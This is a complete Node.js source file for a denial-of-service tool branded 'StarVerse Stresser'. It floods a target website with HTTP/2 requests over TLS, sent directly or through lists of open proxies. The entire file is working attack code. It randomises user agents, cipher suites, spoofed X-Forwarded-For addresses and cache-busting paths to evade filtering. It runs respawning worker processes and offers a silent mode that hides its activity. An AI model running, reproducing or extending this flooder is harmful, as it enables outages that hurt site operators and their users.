const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");

// ===== SILENT MODE & ERROR SUPPRESSION =====
const originalConsole = { log: console.log, error: console.error, warn: console.warn };
if (process.argv.includes("--silent")) {
    console.log = () => {};
    console.error = () => {};
    console.warn = () => {};
    process.stdout.write = () => true;
    process.stderr.write = () => true;
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.removeAllListeners('warning');
process.on('warning', () => {});
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ===== VALIDASI ARGS =====
if (process.argv.length < 5) {
    originalConsole.log(`Usage: node tls.js URL TIME RATE THREADS [PROXY_FILE] [--silent]`);
    originalConsole.log(`Example: node tls.js https://target.com 300 150 8 proxies.txt --silent`);
    process.exit();
}

// ===== PARSE TARGET =====
let targetUrl;
try {
    targetUrl = new URL(process.argv[2]);
} catch {
    originalConsole.log(`[!] Invalid URL format`);
    process.exit();
}

// ===== BLACKLIST =====
const blackList = [
    'https://chinhphu.vn', 'https://ngocphong.com', 'https://virustotal.com', 
    'https://cloudflare.com', 'https://check-host.cc/', 'https://check-host.net/', 
    'https://open.spotify.com', 'https://snapchat.com', 'https://usa.gov', 
    'https://fbi.gov', 'https://nasa.gov', 'https://google.com', 
    'https://translate.google.com', 'https://github.com', 'https://youtube.com', 
    'https://facebook.com', 'https://chat.openai.com', 'https://shopee.vn', 
    'https://mail.google.com', 'https://tiktok.com', 'https://instagram.com', 
    'https://twitter.com', 'https://telegram.org'
];

if (blackList.includes(targetUrl.href)) {
    originalConsole.log("[!] Website ini dalam blacklist");
    process.exit(1);
}

// ===== ARGS =====
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

// ===== VALIDASI INPUT =====
if (args.time < 0) {
    originalConsole.log("[!] Time must be positive");
    process.exit(1);
}

if (args.rate < 0 || args.rate > 1024) {
    originalConsole.log("[!] Rate: 0-1024 req/sec");
    process.exit(1);
}

if (args.threads < 0 || args.threads > 256) {
    originalConsole.log("[!] Threads: 0-256");
    process.exit(1);
}

// ===== PROXY LOAD =====
const proxyFile = process.argv[6] || "proxy.txt";
let proxies = ["direct:0"];

if (proxyFile && fs.existsSync(proxyFile)) {
    try {
        proxies = fs.readFileSync(proxyFile, "utf-8")
            .split(/\r?\n/)
            .filter(line => line.includes(':') && line.trim())
            .slice(0, 2000);
    } catch {
        proxies = ["direct:0"];
    }
}

// ===== ENHANCED UA GENERATOR =====
class AdvancedUAGenerator {
    static browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera", "Brave", "Vivaldi"];
    static osList = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 6.1; Win64; x64",
        "Windows NT 6.3; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 11_6_0",
        "X11; Linux x86_64",
        "X11; Ubuntu; Linux x86_64",
        "Android 10; Mobile",
        "Android 11; Mobile",
        "iPhone; CPU iPhone OS 14_0 like Mac OS X",
        "iPad; CPU OS 14_0 like Mac OS X"
    ];
    
    static chromeVersions = Array.from({length: 50}, (_, i) => `9${i < 10 ? '0' : ''}${Math.floor(Math.random() * 100)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 300)}`);
    static firefoxVersions = Array.from({length: 30}, (_, i) => `${90 + i}.0`);
    
    static randomElement(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }
    
    static generate() {
        const browser = this.randomElement(this.browsers);
        const os = this.randomElement(this.osList);
        
        if (browser === "Chrome" || browser === "Edge" || browser === "Opera" || browser === "Brave" || browser === "Vivaldi") {
            const chromeVersion = this.randomElement(this.chromeVersions);
            if (browser === "Edge") {
                return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36 Edg/${chromeVersion}`;
            } else if (browser === "Opera") {
                return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36 OPR/${chromeVersion}`;
            } else if (browser === "Brave") {
                return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36 Brave/${chromeVersion}`;
            } else if (browser === "Vivaldi") {
                return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36 Vivaldi/${chromeVersion}`;
            } else {
                return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36`;
            }
        }
        
        if (browser === "Firefox") {
            const firefoxVersion = this.randomElement(this.firefoxVersions);
            return `Mozilla/5.0 (${os}; rv:${firefoxVersion}) Gecko/20100101 Firefox/${firefoxVersion}`;
        }
        
        if (browser === "Safari") {
            const safariVersion = ["605.1.15", "610.1.1", "612.1.1", "614.1.1"][Math.floor(Math.random() * 4)];
            return `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/${safariVersion} (KHTML, like Gecko) Version/14.1.2 Safari/${safariVersion}`;
        }
        
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36`;
    }
    
    static generateMobile() {
        const devices = [
            `Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36`,
            `Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36`,
            `Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36`,
            `Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1`,
            `Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1`,
            `Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1`
        ];
        return devices[Math.floor(Math.random() * devices.length)];
    }
}

// ===== GENERATE 2000 UA =====
let userAgents = [];
for (let i = 0; i < 2000; i++) {
    userAgents.push(Math.random() > 0.7 ? AdvancedUAGenerator.generateMobile() : AdvancedUAGenerator.generate());
}

// ===== CIPHER POOL (MULTI-CIPHER SUPPORT) =====
const cipherPools = [
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA",
    "TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

// ===== RANDOM FUNCTIONS =====
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// ===== HEADER GENERATOR =====
const langHeaders = [
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7',
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
    'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
    'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9',
    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'
];

const encodingHeaders = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    '*'
];

function generateHeaders() {
    return {
        ":method": "GET",
        ":scheme": "https",
        ":authority": targetUrl.hostname,
        ":path": targetUrl.pathname + (targetUrl.pathname.includes('?') ? '&' : '?') + 
                `v=${Date.now()}_${randomString(8)}`,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": randomElement(langHeaders),
        "accept-encoding": randomElement(encodingHeaders),
        "cache-control": "no-cache, no-store, must-revalidate",
        "pragma": "no-cache",
        "upgrade-insecure-requests": "1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": Math.random() > 0.5 ? "same-origin" : "cross-site",
        "sec-fetch-user": "?1",
        "user-agent": randomElement(userAgents),
        "x-forwarded-for": randomIP(),
        "referer": `https://${targetUrl.hostname}/`,
        "x-requested-with": Math.random() > 0.5 ? "XMLHttpRequest" : undefined
    };
}

// ===== MAIN ATTACK CLASS =====
class UltimateFlooder {
    constructor() {
        this.connections = 0;
        this.requests = 0;
        this.lastLog = Date.now();
    }

    getRandomCipher() {
        return randomElement(cipherPools);
    }

    createTLSConnection(proxy, callback) {
        // Direct connection
        if (proxy === "direct:0") {
            const socket = net.connect({
                host: targetUrl.hostname,
                port: 443,
                timeout: 5000
            });

            socket.setTimeout(5000);
            socket.setNoDelay(true);

            socket.on("error", () => {
                socket.destroy();
                callback(new Error("Socket error"), null, null);
            });

            socket.on("timeout", () => {
                socket.destroy();
                callback(new Error("Timeout"), null, null);
            });

            const tlsSocket = tls.connect({
                socket: socket,
                host: targetUrl.hostname,
                servername: targetUrl.hostname,
                ciphers: this.getRandomCipher(),
                secureProtocol: "TLSv1_2_method",
                secureOptions: 
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1 |
                    crypto.constants.ALPN_ENABLED |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1']
            }, () => {
                callback(null, tlsSocket, socket);
            });

            tlsSocket.on("error", () => {
                callback(new Error("TLS error"), null, null);
            });

            return;
        }

        // Proxy connection
        const [proxyHost, proxyPort] = proxy.split(":");
        const connectPayload = `CONNECT ${targetUrl.hostname}:443 HTTP/1.1\r\nHost: ${targetUrl.hostname}:443\r\nConnection: Keep-Alive\r\n\r\n`;

        const socket = net.connect({
            host: proxyHost,
            port: parseInt(proxyPort) || 8080,
            timeout: 5000
        });

        socket.setTimeout(5000);
        socket.setNoDelay(true);

        socket.on("error", () => {
            socket.destroy();
            callback(new Error("Proxy socket error"), null, null);
        });

        socket.on("timeout", () => {
            socket.destroy();
            callback(new Error("Proxy timeout"), null, null);
        });

        socket.once("connect", () => {
            socket.write(connectPayload);
        });

        socket.once("data", (chunk) => {
            if (chunk.toString().includes("200")) {
                const tlsSocket = tls.connect({
                    socket: socket,
                    host: targetUrl.hostname,
                    servername: targetUrl.hostname,
                    ciphers: this.getRandomCipher(),
                    secureProtocol: "TLSv1_2_method",
                    secureOptions: 
                        crypto.constants.SSL_OP_NO_SSLv2 |
                        crypto.constants.SSL_OP_NO_SSLv3 |
                        crypto.constants.SSL_OP_NO_TLSv1 |
                        crypto.constants.SSL_OP_NO_TLSv1_1 |
                        crypto.constants.ALPN_ENABLED |
                        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2', 'http/1.1']
                }, () => {
                    callback(null, tlsSocket, socket);
                });

                tlsSocket.on("error", () => {
                    callback(new Error("Proxy TLS error"), null, null);
                });
            } else {
                socket.destroy();
                callback(new Error("Proxy rejected"), null, null);
            }
        });
    }

    attack() {
        const proxy = proxies.length > 0 ? randomElement(proxies) : "direct:0";
        
        this.createTLSConnection(proxy, (err, tlsSocket, rawSocket) => {
            if (err || !tlsSocket) return;

            this.connections++;

            const client = http2.connect(targetUrl.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                },
                maxSessionMemory: 64000
            });

            client.on("error", () => {});
            client.on("goaway", () => {});
            client.on("frameError", () => {});

            client.on("connect", () => {
                const startTime = Date.now();
                const attackInterval = setInterval(() => {
                    try {
                        for (let i = 0; i < Math.max(1, Math.floor(args.rate / 10)); i++) {
                            const req = client.request(generateHeaders());
                            this.requests++;
                            
                            req.on("response", () => {
                                req.close();
                            });
                            
                            req.on("error", () => {});
                            req.end();

                            // Log every 5 seconds
                            if (Date.now() - this.lastLog > 5000) {
                                if (!process.argv.includes("--silent")) {
                                    originalConsole.log(`[+] Connections: ${this.connections} | Requests: ${this.requests} | Running: ${Math.floor((Date.now() - startTime) / 1000)}s`);
                                }
                                this.lastLog = Date.now();
                            }
                        }
                    } catch (e) {
                        // Silent catch
                    }

                    // Stop after time
                    if (Date.now() - startTime > args.time * 1000) {
                        clearInterval(attackInterval);
                        try { client.destroy(); } catch {}
                        try { if (rawSocket) rawSocket.destroy(); } catch {}
                    }
                }, 100);
            });

            // Auto cleanup after 30 seconds
            setTimeout(() => {
                try { client.destroy(); } catch {}
                try { if (rawSocket) rawSocket.destroy(); } catch {}
            }, 30000);
        });
    }
}

// ===== EXECUTION =====
if (cluster.isMaster) {
    // Display info
    originalConsole.log(`╔══════════════════════════════════════`);
    originalConsole.log(`║        StarVerse Stresser       `);
    originalConsole.log(`╠══════════════════════════════════════`);
    originalConsole.log(`║ Target: ${targetUrl.href.padEnd(28)}`);
    originalConsole.log(`║ Time: ${args.time.toString().padEnd(31)}`);
    originalConsole.log(`║ Rate: ${args.rate.toString().padEnd(31)}`);
    originalConsole.log(`║ Threads: ${args.threads.toString().padEnd(28)}`);
    originalConsole.log(`║ Proxies: ${proxies.length > 1 ? proxies.length.toString().padEnd(27) : 'DIRECT'.padEnd(27)}`);
    originalConsole.log(`║ Mode: ${process.argv.includes("--silent") ? 'SILENT'.padEnd(30) : 'VERBOSE'.padEnd(29)}`);
    originalConsole.log(`╚══════════════════════════════════════\n`);

    // Create workers
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    cluster.on("exit", (worker) => {
        cluster.fork();
    });

    // Auto exit
    setTimeout(() => {
        originalConsole.log(`\n[+] Attack completed.`);
        process.exit();
    }, args.time * 1000 + 5000);

} else {
    const flooder = new UltimateFlooder();
    
    // Start multiple attack loops
    const loops = Math.min(10, Math.max(1, Math.floor(args.rate / 10)));
    for (let i = 0; i < loops; i++) {
        setTimeout(() => {
            setInterval(() => flooder.attack(), 50);
        }, i * 100);
    }
}